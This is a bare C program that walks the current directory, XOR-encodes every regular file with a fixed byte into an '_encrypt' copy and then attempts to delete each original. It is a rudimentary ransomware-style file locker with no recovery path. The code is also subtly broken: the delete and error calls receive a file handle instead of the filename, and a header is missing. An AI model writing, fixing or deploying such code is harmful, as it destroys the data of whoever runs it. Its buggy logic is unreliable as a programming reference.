#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>

// Function prototypes
void xor_file(const char *filename);

int main()
{
  // Open the current directory
  char private_key[4] = "0xAA";
  DIR *dir = opendir(".");
  if (dir == NULL) {
    perror("opendir");
    return EXIT_FAILURE;
  }

  // Iterate over all entries in the directory
  struct dirent *entry;
  while ((entry = readdir(dir)) != NULL) {
    // Check if the entry is a regular file and not a directory
    if (entry->d_type == DT_REG) {
      // Perform a XOR operation on the file
      xor_file(entry->d_name);
    }
  }

  // Close the directory
  closedir(dir);
  return 0;
}

// Function to perform a XOR operation on a file
void xor_file(const char *filename)
{
  // Open the input file for reading
  FILE *in_file = fopen(filename, "rb");
  if (in_file == NULL) {
    perror(filename);
    return;
  }

  // Open the output file for writing
  char out_filename[FILENAME_MAX];
  snprintf(out_filename, sizeof out_filename, "%s_encrypt", filename);
  FILE *out_file = fopen(out_filename, "wb");
  if (out_file == NULL) {
    perror(out_filename);
    fclose(in_file);
    return;
  }

  // Perform the XOR operation on the input file
  int c;
  while ((c = fgetc(in_file)) != EOF) {
    // XOR the character with the value 0xAA
    c ^= 0xAA;
    fputc(c, out_file);
  }

  // Close the input and output files
  fclose(in_file);
  fclose(out_file);
   if (unlink(in_file) == -1) {
        perror(in_file);
  }
}
